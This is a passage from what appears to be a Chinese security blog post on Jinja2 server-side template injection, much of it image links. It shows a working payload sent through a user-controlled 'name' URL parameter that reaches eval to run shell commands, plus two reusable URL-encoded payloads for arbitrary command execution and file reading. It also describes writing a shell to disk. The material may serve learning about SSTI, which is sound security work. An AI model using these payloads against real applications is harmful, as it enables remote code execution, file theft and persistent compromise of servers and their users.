...
<img src='https://oxfay.github.io/public/image/113025.png'>

就可以称为一个简单的前端模板引擎了。它完成的事就是对标签中<% %>的内容进行匹配和替换。而这些值可控且时，就可能造成xss。

又比如常见的jinja2模板引擎:

<img src='https://oxfay.github.io/public/image/114944.png'>
...
<img src='https://oxfay.github.io/public/image/27.png'>
...
<img src='https://oxfay.github.io/public/image/113450.png'>

可以看到其中的name是用户可控的

首先xss是肯定有的

<img src='https://oxfay.github.io/public/image/164623.png'>
...
<img src='https://oxfay.github.io/public/image/165846.png'>
...
<img src='https://oxfay.github.io/public/image/170720.png'>
...
<img src='https://oxfay.github.io/public/image/094313.png'>
...
<img src='https://oxfay.github.io/public/image/095552.png'>
...
<img src='https://oxfay.github.io/public/image/100013.png'>
...
<img src='https://oxfay.github.io/public/image/100713.png'>
...
<img src='https://oxfay.github.io/public/image/103823.png'>
...
<img src='https://oxfay.github.io/public/image/115446.png'>

可以看到全局变量下的字典中的字典`'__builtins__'`中含有eval函数，调用该eval函数去执行我们想要执行的命令就行了

`http://127.0.0.1:8848/login?name={{''.__class__.__mro__[1].__subclasses__()[146].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}`

<img src='https://oxfay.github.io/public/image/120059.png'>


下面是通用payload:

```
{%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}
{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}{%%20if%20b.__class__%20==%20{}.__class__%20%}{%%20if%20%27eval%27%20in%20b.keys()%20%}{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22这里输入需要执行的命令%22).read()%27)%20}}{%%20endif%20%}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}
```
...
```
{%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}
{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}{%%20if%20b.__class__%20==%20{}.__class__%20%}{%%20if%20%27eval%27%20in%20b.keys()%20%}{{%20b[%27open%27](%27修改为欲读取文件地址%27).read()%20}}{%%20endif%20%}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}
```

明白原理后自行修改也非常方便，这样去调用应该和python的类的继承有关系

<img src='https://oxfay.github.io/public/image/160706.png'>

#### 写shell

也可以通过`open()`函数的`write()`方法向文件中写入shell

<img src='https://oxfay.github.io/public/image/103446.png'>
...
<img src='https://oxfay.github.io/public/image/224400.png'>

可以看到，config类里已经有了名为shell的system函数

<img src='https://oxfay.github.io/public/image/224725.png'>

再调用该函数去执行命令，可以看到，能执行成功(system)

<img src='https://oxfay.github.io/public/image/224557.png'>
...
<img src='https://oxfay.github.io/public/image/180719.png'>

跑了哈客户端的脚本，运行成功

<img src='https://oxfay.github.io/public/image/180910.png'>
...
<img src='https://oxfay.github.io/public/image/110757.png'>

<img src='https://oxfay.github.io/public/image/120612.png'>

甚至可以直接调用os库而不用eval去import os库

<img src='https://oxfay.github.io/public/image/164726.png'>
...
<img src='https://oxfay.github.io/public/image/165734.png'>

使用效果相同：

<img src='https://oxfay.github.io/public/image/165947.png'>
...
<img src='https://oxfay.github.io/public/image/223453.png'>
...
<img src='https://oxfay.github.io/public/image/222023.png'>
...
<img src='https://oxfay.github.io/public/image/225730.png'>
...
<img src='https://oxfay.github.io/public/image/001338.png'>
...
<img src='https://oxfay.github.io/public/image/003153.png'>
...
<img src='https://oxfay.github.io/public/image/233016.png'>
...
<img src='https://oxfay.github.io/public/image/003500.png'>
...
<img src='https://oxfay.github.io/public/image/003948.png'>
...
<img src='https://oxfay.github.io/public/image/004317.png'>
...
<img src='https://oxfay.github.io/public/image/005358.png'>
...
<img src='https://oxfay.github.io/public/image/122446.png'>
...
<img src='https://oxfay.github.io/public/image/141305.png'>
...
<img src='https://oxfay.github.io/public/image/150240.png'>
...
<img src='https://oxfay.github.io/public/image/164216.png'>
...
<img src='https://oxfay.github.io/public/image/202150.png'>

<img src='https://oxfay.github.io/public/image/202236.png'>

<img src='https://oxfay.github.io/public/image/203308.png'>
...
ps：xswl，文章里有些地方`{% %}`没用反引号包起来，还给我报错了，直接把页面弄崩了。。。
